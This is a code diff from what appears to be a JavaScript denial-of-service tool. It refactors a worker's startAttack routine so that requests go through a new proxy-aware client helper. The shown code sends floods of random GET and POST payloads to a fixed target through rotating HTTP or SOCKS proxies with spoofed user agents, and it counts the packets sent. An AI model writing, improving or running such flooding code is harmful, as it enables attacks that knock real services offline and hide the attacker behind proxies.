@@ -1,7 +1,6 @@
-import axios from "axios";
-import { SocksProxyAgent } from "socks-proxy-agent";
 import { parentPort, workerData } from "worker_threads";
 
+import { createMimicHttpClient } from "../utils/clientUtils.js";
 import { randomBoolean, randomString } from "../utils/randomUtils.js";
 
 const startAttack = () => {
@@ -14,39 +13,14 @@ const startAttack = () => {
 
   const sendRequest = async (proxy, userAgent) => {
     try {
-      const config = {
-        headers: { "User-Agent": userAgent },
-        timeout: 2000,
-        validateStatus: (status) => {
-          return status < 500;
-        },
-      };
-
-      if (proxy.protocol === "http") {
-        config.proxy = {
-          host: proxy.host,
-          port: proxy.port,
-        };
-
-        if (proxy.username && proxy.password) {
-          config.proxy.auth = {
-            username: proxy.username,
-            password: proxy.password,
-          }
-        }
-      } else if (proxy.protocol === "socks4" || proxy.protocol === "socks5") {
-        config.httpAgent, config.httpsAgent = new SocksProxyAgent(
-          `${proxy.protocol}://${proxy.username && proxy.password ? `${proxy.username}:${proxy.password}@` : ""}${proxy.host}:${proxy.port}`
-        );
-      }
-
+      const client = createMimicHttpClient(proxy, userAgent);
       const isGet = packetSize > 64 ? false : randomBoolean();
       const payload = randomString(packetSize);
 
       if (isGet) {
-        await axios.get(`${fixedTarget}/${payload}`, config);
+        await client.get(`${fixedTarget}/${payload}`);
       } else {
-        await axios.post(fixedTarget, payload, config);
+        await client.post(fixedTarget, payload);
       }
 
       totalPackets++;
